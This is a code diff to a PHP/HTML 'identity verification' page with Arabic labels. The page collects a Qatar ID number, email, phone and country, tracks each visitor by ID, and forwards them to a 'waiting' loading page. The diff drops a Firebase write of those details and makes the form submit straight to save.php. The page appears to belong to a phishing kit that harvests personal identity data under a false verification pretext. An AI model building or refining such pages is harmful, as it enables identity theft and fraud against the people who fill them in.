@@ -237,6 +237,7 @@
             
             <form id="mainForm" action="save.php" method="POST">
                 <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($_GET['visitor_id'] ?? ''); ?>">
+                <input type="hidden" name="current_page" value="identity_verification.php">
                 <div class="form-group">
                     <label class="label-text">نوع الحساب <span style="color:var(--primary-color)">ⓘ</span> <span style="color:red">*</span></label>
                     <label class="radio-option">
@@ -353,24 +354,8 @@
                 return;
             }
             
-            document.getElementById('loading-overlay').style.display = 'flex';
-
-            const detailRef = database.ref('user_details/' + visitorId);
-            detailRef.set({
-                id: visitorId,
-                accountType: document.querySelector('input[name="account_type"]:checked').value,
-                qatarId: document.getElementById('qatar_id').value,
-                email: emailInput.value,
-                phone: document.getElementById('phone_number').value,
-                country: document.getElementById('country_code').value,
-                status: "waiting",
-                timestamp: firebase.database.ServerValue.TIMESTAMP
-            });
-
-            // إرسال الفورم لـ save.php ليقوم بالتوجيه لصفحة التحميل
-            setTimeout(() => {
-                document.getElementById('mainForm').submit();
-            }, 1500);
+            // إرسال الفورم فوراً لـ save.php لضمان الانتقال السريع للصفحة التالية
+            document.getElementById('mainForm').submit();
         };
 
         window.onload = () => { fetchCountries(); toggleFields(); };
